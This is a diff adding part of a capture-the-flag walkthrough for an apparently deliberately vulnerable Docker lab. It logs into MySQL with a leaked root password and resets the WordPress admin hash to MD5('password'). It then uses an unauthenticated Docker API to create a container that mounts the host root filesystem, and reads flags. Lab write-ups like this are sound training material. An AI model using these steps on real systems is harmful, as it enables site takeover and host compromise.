@@ -246,9 +246,144 @@ http://192.168.253.129:8822/
 ```
 And we should get:
 
-<center><img alt="content_db_1 ssh web API" src="files/images/db_1-ssh.PNG" /></center>
+<center><img alt="content_db_1 ssh web API" src="files/images/db_1-ssh.png" /></center>
 
+This is the web API for the ssh connection of the ssh image we're using. Let's test this:
 
+```bash
+/ $ mysql -u root -p
+Enter password:
+```
 
+As for the password we're using what we've got from the inspect of the db container: `Peaches123`. And it worked!
+```bash
+Welcome to the MySQL monitor.  Commands end with ; or \g.   
+Your MySQL connection id is 5
+Server version: 5.7.19 MySQL Community Server (GPL)
 
+Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.        
 
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective       
+owners.        
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                                                           
+
+mysql> 
+```
+
+## Finding the first flag
+
+Feel free to roam through the tables and databases - nothing too interesting except this table:
+```
+mysql> select * from wordpress.wp_users;                                                                                                                                                                                                                                                  
++----+------------+------------------------------------+---------------+----------------------------+----------+---------------------+---------------------+-------------+--------------+                                                                                                 
+| ID | user_login | user_pass                          | user_nicename | user_email                 | user_url | user_registered     | user_activation_key | user_status | display_name |                                                                                                 
++----+------------+------------------------------------+---------------+----------------------------+----------+---------------------+---------------------+-------------+--------------+                                                                                                 
+|  1 | bob        | $P$B0VtNkHE4cR4TTnEMypX1XyR3tu3z1. | bob           | vulndocker@notsosecure.com |          | 2017-08-19 04:35:41 |                     |           0 | bob          |                                                                                                 
++----+------------+------------------------------------+---------------+----------------------------+----------+---------------------+---------------------+-------------+--------------+                                                                                                 
+1 row in set (0.01 sec)  
+```
+
+Which means that we could get into the wordpress account, if only we knew what hash we should put in the user_pass column.
+
+That required a little bit of research but: Wordpress, in the past, used MD5 hash algorithm but changed it - to make accounts more secure. But, for backward compatability, it's still checking, first, MD5 hash - if it finds that that's the case it gets you in but, on the way, change the hash to the more secure one.
+
+For us - we only need to use MD5:
+```
+mysql> UPDATE wordpress.wp_users SET user_pass=MD5("password") WHERE ID=1; 
+```
+
+And that's it. We have access to the admin account of the site. 
+
+On wordpress, the login page is on: /wp-admin. Use `bob` as username and `password` as the password.
+```
+http://192.168.253.129:8000/wp-admin/
+```
+
+After accessing it, you can find immediatly the first flag `flag_1` under Drafts.
+```
+2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998
+
+good job finding this one. Now Lets hunt for the other flags
+
+hint: they are in files.
+```
+
+## Finding the second flag
+
+We have some clue as to what to be looking for - a file. Easy, right?
+
+```
+/ $ find . -name *flag*
+```
+
+Nothing.
+
+Well, if you remeber we have two more containers: `content_ssh_1` and `content_wordpress_1` - maybe it's there?
+
+Trust, it's not. You can search for yourself by creating new ssh container and connects it to the `content_wordpress_1` container. This is to be done by only changing the `CONTAINER=content_wordpress_1` environment variable.
+
+OK, so if it's not on any of the containers, where can it be? Mmmmmm well ... all of these docker containers needs to run on a host, right? maybe it's there? But how to get access to the host's file system?
+
+Remeber the mounting thing? We need to mount the file system itself to some (new) container, connects to it through shh container, and than, we'll have access to the host's file system itself:
+
+Post request to:
+
+```
+http://192.168.253.129:2375/containers/create?name=content_wordpress_2
+```
+
+With body:
+```
+{
+	"Image": "wordpress",
+	
+	"Name" : "content_wordpress_2",
+	
+	"HostConfig": {
+			"Binds": [
+				"/:/host-files:rw"
+				]
+	}
+}
+```
+
+I used here the wordpress image. It doesn't really matter - we only need that the host machine will have that image already. We also need to be sure that the new container will have bash in it (these are images - it's not obvious what is installed on them) for the ssh container.
+
+The ssh container is straight forward 'Copy-Paste' from the previous one - just change the names and ports where is needed.
+
+In the new container:
+```bash
+/var/www/html $ cd / 
+/ $ ls
+bin  boot  dev  etc  home  host-files  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+```
+
+Impress with the `host-files` directory. This is the host machine file system root!
+```bash
+/ $ cd host-files
+/host-files $ ls
+bin  boot  dev  etc  flag_3  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz
+```
+
+And watch! We've found the second flag!
+```bash
+/host-files $ cat flag_3
+d867a73c70770e73b65e6949dd074285dfdee80a8db333a7528390f6
+
+Awesome so you reached host
+
+Well done
+
+Now the bigger challenge try to understand and fix the bugs.
+
+If you want more attack targets look at the shadow file and try cracking passwords :P
+
+Thanks for playing the challenges we hope you enjoyed all levels
+
+You can send your suggestions bricks bats criticism or appreciations
+on vulndocker@notsosecure.com  
+```
+
+## Some conclusions
